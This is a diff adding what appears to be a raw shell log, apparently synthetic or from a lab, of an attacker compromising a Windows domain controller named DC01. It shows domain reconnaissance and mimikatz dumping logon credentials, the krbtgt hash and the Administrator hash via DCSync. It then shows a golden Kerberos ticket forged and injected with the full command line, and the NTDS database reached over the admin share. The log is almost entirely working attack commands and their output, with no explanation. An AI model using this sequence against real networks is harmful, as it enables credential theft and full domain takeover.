@@ -1,0 +1,308 @@
+[2024-01-15 14:28:45] C:\Windows\System32> whoami
+nt authority\system
+
+[2024-01-15 14:28:52] C:\Windows\System32> hostname
+DC01
+
+[2024-01-15 14:29:03] C:\Windows\System32> ipconfig
+
+Windows IP Configuration
+
+Ethernet adapter Ethernet0:
+
+   Connection-specific DNS Suffix  . : 
+   IPv4 Address. . . . . . . . . . . : 10.10.50.10
+   Subnet Mask . . . . . . . . . . . : 255.255.255.0
+   Default Gateway . . . . . . . . . : 10.10.50.1
+
+[2024-01-15 14:29:18] C:\Windows\System32> net user /domain
+The request will be processed at a domain controller for domain TECHCORP.local
+
+User accounts for \\DC01.TECHCORP.local
+
+-------------------------------------------------------------------------------
+Administrator            Guest                    krbtgt
+jdoe                     msmith                   bwilson
+sysadmin                 helpdesk                 sqlservice
+The command completed successfully.
+
+[2024-01-15 14:29:45] C:\Windows\System32> cd C:\temp
+
+[2024-01-15 14:29:48] C:\temp> dir
+ Volume in drive C has no label.
+ Volume Serial Number is 5E2A-3B1C
+
+ Directory of C:\temp
+
+01/15/2024  02:25 PM    <DIR>          .
+01/15/2024  02:25 PM    <DIR>          ..
+01/15/2024  02:23 PM         1,245,184 mimikatz.exe
+01/15/2024  02:24 PM            15,428 procdump.exe
+               2 File(s)      1,260,612 bytes
+               2 Dir(s)  42,358,554,624 bytes free
+
+[2024-01-15 14:30:01] C:\temp> mimikatz.exe
+
+  .#####.   mimikatz 2.2.0 (x64) #19041 Sep 19 2022 17:44:08
+ .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
+ ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
+ ## \ / ##       > https://blog.gentilkiwi.com/mimikatz
+ '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
+  '#####'        > https://pingcastle.com / https://mysmartlogon.com ***/
+
+mimikatz # privilege::debug
+Privilege '20' OK
+
+mimikatz # sekurlsa::logonpasswords
+
+Authentication Id : 0 ; 125843 (00000000:0001ebb3)
+Session           : Interactive from 1
+User Name         : DWM-1
+Domain            : Window Manager
+Logon Server      : (null)
+Logon Time        : 1/15/2024 2:15:22 PM
+SID               : S-1-5-90-0-1
+        msv :
+         [00000003] Primary
+         * Username : DC01$
+         * Domain   : TECHCORP
+         * NTLM     : f3c89ab2e145d678a90b12c456e789de
+        tspkg :
+        wdigest :
+         * Username : DC01$
+         * Domain   : TECHCORP
+         * Password : (null)
+        kerberos :
+         * Username : DC01$
+         * Domain   : TECHCORP.local
+         * Password : (null)
+
+Authentication Id : 0 ; 996 (00000000:000003e4)
+Session           : Service from 0
+User Name         : DC01$
+Domain            : TECHCORP
+Logon Server      : (null)
+Logon Time        : 1/15/2024 2:15:18 PM
+SID               : S-1-5-20
+        msv :
+         [00000003] Primary
+         * Username : DC01$
+         * Domain   : TECHCORP
+         * NTLM     : f3c89ab2e145d678a90b12c456e789de
+
+[2024-01-15 14:31:22] mimikatz # lsadump::lsa /inject /name:krbtgt
+
+Domain : TECHCORP / S-1-5-21-2894731341-3578412290-4198663980
+
+RID  : 000001f6 (502)
+User : krbtgt
+
+ * Primary
+    NTLM : 8a7f2b6c3d4e5a1f9b8c7d6e5f4a3b2c
+    LM   : 
+  Hash NTLM: 8a7f2b6c3d4e5a1f9b8c7d6e5f4a3b2c
+    ntlm- 0: 8a7f2b6c3d4e5a1f9b8c7d6e5f4a3b2c
+    lm  - 0: 3e2a1f4d5c6b7a8e9f0d1c2b3a4e5f6d
+
+[2024-01-15 14:32:05] mimikatz # lsadump::dcsync /user:Administrator
+[DC] 'TECHCORP.local' will be the domain
+[DC] 'DC01.TECHCORP.local' will be the DC server
+[DC] 'Administrator' will be the user account
+
+Object RDN           : Administrator
+
+** SAM ACCOUNT **
+
+SAM Username         : Administrator
+Account Type         : 30000000 ( USER_OBJECT )
+User Account Control : 00000200 ( NORMAL_ACCOUNT )
+Account expiration   : 
+Password last change : 1/10/2024 10:23:45 AM
+Object Security ID   : S-1-5-21-2894731341-3578412290-4198663980-500
+Object Relative ID   : 500
+
+Credentials:
+  Hash NTLM: 3f4d8a9b2e1c7d6f5a4b3c2d1e9f8a7b
+    ntlm- 0: 3f4d8a9b2e1c7d6f5a4b3c2d1e9f8a7b
+    ntlm- 1: a1b2c3d4e5f6a7b8c9d0e1f2a3b4c5d6
+    lm  - 0: 2e3f4a5b6c7d8e9f0a1b2c3d4e5f6a7b
+
+[2024-01-15 14:32:48] mimikatz # exit
+Bye!
+
+[2024-01-15 14:33:02] C:\temp> whoami /all
+
+USER INFORMATION
+----------------
+
+User Name           SID
+=================== ==============================================
+nt authority\system S-1-5-18
+
+
+GROUP INFORMATION
+-----------------
+
+Group Name                             Type             SID          Attributes
+====================================== ================ ============ ==================================================
+BUILTIN\Administrators                 Alias            S-1-5-32-544 Enabled by default, Enabled group, Group owner
+Everyone                               Well-known group S-1-1-0      Mandatory group, Enabled by default, Enabled group
+NT AUTHORITY\Authenticated Users       Well-known group S-1-5-11    Mandatory group, Enabled by default, Enabled group
+
+
+PRIVILEGES INFORMATION
+----------------------
+
+Privilege Name                Description                    State
+============================= ============================== ========
+SeAssignPrimaryTokenPrivilege Replace a process level token  Disabled
+SeIncreaseQuotaPrivilege      Adjust memory quotas           Disabled
+SeSecurityPrivilege           Manage auditing and security   Disabled
+SeTakeOwnershipPrivilege      Take ownership                 Disabled
+SeLoadDriverPrivilege         Load and unload device drivers Disabled
+SeSystemProfilePrivilege      Profile system performance     Disabled
+SeSystemtimePrivilege         Change the system time         Disabled
+SeBackupPrivilege             Back up files and directories  Disabled
+SeRestorePrivilege            Restore files and directories  Disabled
+SeShutdownPrivilege           Shut down the system           Disabled
+SeDebugPrivilege              Debug programs                 Enabled
+SeAuditPrivilege              Generate security audits       Disabled
+SeSystemEnvironmentPrivilege  Modify firmware values         Disabled
+SeImpersonatePrivilege        Impersonate a client           Enabled
+SeCreateGlobalPrivilege       Create global objects          Enabled
+
+[2024-01-15 14:33:35] C:\temp> net group "Domain Admins" /domain
+The request will be processed at a domain controller for domain TECHCORP.local
+
+Group name     Domain Admins
+Comment        Designated administrators of the domain
+
+Members
+
+-------------------------------------------------------------------------------
+Administrator            sysadmin
+The command completed successfully.
+
+[2024-01-15 14:34:12] C:\temp> net accounts /domain
+The request will be processed at a domain controller for domain TECHCORP.local
+
+Force user logoff how long after time expires?:       Never
+Minimum password age (days):                          1
+Maximum password age (days):                          90
+Minimum password length:                              7
+Length of password history maintained:                24
+Lockout threshold:                                    5
+Lockout duration (minutes):                           30
+Lockout observation window (minutes):                 30
+Computer role:                                        PRIMARY
+The command completed successfully.
+
+[2024-01-15 14:35:18] C:\temp> mimikatz.exe
+
+  .#####.   mimikatz 2.2.0 (x64) #19041 Sep 19 2022 17:44:08
+ .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
+ ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
+ ## \ / ##       > https://blog.gentilkiwi.com/mimikatz
+ '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
+  '#####'        > https://pingcastle.com / https://mysmartlogon.com ***/
+
+mimikatz # kerberos::golden /user:Administrator /domain:TECHCORP.local /sid:S-1-5-21-2894731341-3578412290-4198663980 /krbtgt:8a7f2b6c3d4e5a1f9b8c7d6e5f4a3b2c /id:500 /groups:512,513,518,519,520 /startoffset:0 /endin:525600 /renewmax:10080 /ptt
+User      : Administrator
+Domain    : TECHCORP.local (TECHCORP)
+SID       : S-1-5-21-2894731341-3578412290-4198663980
+User Id   : 500
+Groups Id : *512 513 518 519 520
+ServiceKey: 8a7f2b6c3d4e5a1f9b8c7d6e5f4a3b2c - rc4_hmac_nt
+Lifetime  : 1/15/2024 2:35:18 PM ; 1/15/2025 2:35:18 PM ; 1/22/2024 2:35:18 PM
+-> Ticket : ** Pass The Ticket **
+
+ * PAC generated
+ * PAC signed
+ * EncTicketPart generated
+ * EncTicketPart encrypted
+ * KrbCred generated
+
+Golden ticket for 'Administrator @ TECHCORP.local' successfully submitted for current session
+
+[2024-01-15 14:36:02] mimikatz # kerberos::list
+
+[00000000] - 0x00000017 - rc4_hmac_nt
+   Start/End/MaxRenew: 1/15/2024 2:35:18 PM ; 1/15/2025 2:35:18 PM ; 1/22/2024 2:35:18 PM
+   Server Name       : krbtgt/TECHCORP.local @ TECHCORP.local
+   Client Name       : Administrator @ TECHCORP.local
+   Flags 40e10000    : name_canonicalize ; pre_authent ; renewable ; forwardable ; 
+
+[2024-01-15 14:36:25] mimikatz # kerberos::ptt golden.kirbi
+ERROR kuhl_m_kerberos_ptt_file ; Unable to open file 'golden.kirbi' (0x00000002)
+
+[2024-01-15 14:36:40] mimikatz # exit
+Bye!
+
+[2024-01-15 14:37:15] C:\temp> dir \\DC01\C$
+ Volume in drive \\DC01\C$ has no label.
+ Volume Serial Number is 5E2A-3B1C
+
+ Directory of \\DC01\C$
+
+01/10/2024  09:15 AM    <DIR>          PerfLogs
+01/12/2024  03:22 PM    <DIR>          Program Files
+01/10/2024  09:45 AM    <DIR>          Program Files (x86)
+01/15/2024  02:25 PM    <DIR>          temp
+01/10/2024  10:30 AM    <DIR>          Users
+01/15/2024  02:15 PM    <DIR>          Windows
+               0 File(s)              0 bytes
+               6 Dir(s)  42,358,554,624 bytes free
+
+[2024-01-15 14:37:28] C:\temp> klist
+
+Current LogonId is 0:0x1ebb3
+
+Cached Tickets: (1)
+
+#0>     Client: Administrator @ TECHCORP.local
+        Server: krbtgt/TECHCORP.local @ TECHCORP.local
+        KerbTicket Encryption Type: RSADSI RC4-HMAC(NT)
+        Ticket Flags 0x40e10000 -> forwardable renewable pre_authent name_canonicalize
+        Start Time: 1/15/2024 14:35:18 (local)
+        End Time:   1/15/2025 14:35:18 (local)
+        Renew Time: 1/22/2024 14:35:18 (local)
+        Session Key Type: RSADSI RC4-HMAC(NT)
+        Cache Flags: 0x1 -> PRIMARY
+        Kdc Called:
+
+[2024-01-15 14:38:05] C:\temp> net use \\DC01\C$ /user:TECHCORP\Administrator
+The command completed successfully.
+
+[2024-01-15 14:38:22] C:\temp> dir \\DC01\C$\Windows\NTDS
+ Volume in drive \\DC01\C$ has no label.
+ Volume Serial Number is 5E2A-3B1C
+
+ Directory of \\DC01\C$\Windows\NTDS
+
+01/15/2024  02:15 PM    <DIR>          .
+01/15/2024  02:15 PM    <DIR>          ..
+01/15/2024  02:30 PM        16,777,216 ntds.dit
+01/15/2024  02:30 PM            16,384 ntds.jfm
+01/10/2024  09:45 AM         1,048,576 temp.edb
+               3 File(s)     17,842,176 bytes
+               2 Dir(s)  42,358,554,624 bytes free
+
+[2024-01-15 14:39:10] C:\temp> echo "Access achieved with golden ticket"
+"Access achieved with golden ticket"
+
+[2024-01-15 14:39:45] C:\temp> wmic computersystem get domain
+Domain
+TECHCORP.local
+
+[2024-01-15 14:40:12] C:\temp> nltest /dsgetdc:TECHCORP.local
+           DC: \\DC01
+      Address: \\10.10.50.10
+     Dom Guid: a1b2c3d4-e5f6-7a8b-9c0d-e1f2a3b4c5d6
+     Dom Name: TECHCORP.local
+  Forest Name: TECHCORP.local
+ Dc Site Name: Default-First-Site-Name
+Our Site Name: Default-First-Site-Name
+        Flags: PDC GC DS LDAP KDC TIMESERV WRITABLE DNS_DC DNS_DOMAIN DNS_FOREST CLOSE_SITE FULL_SECRET WS
+The command completed successfully
+
+[2024-01-15 14:40:58] C:\temp> exit
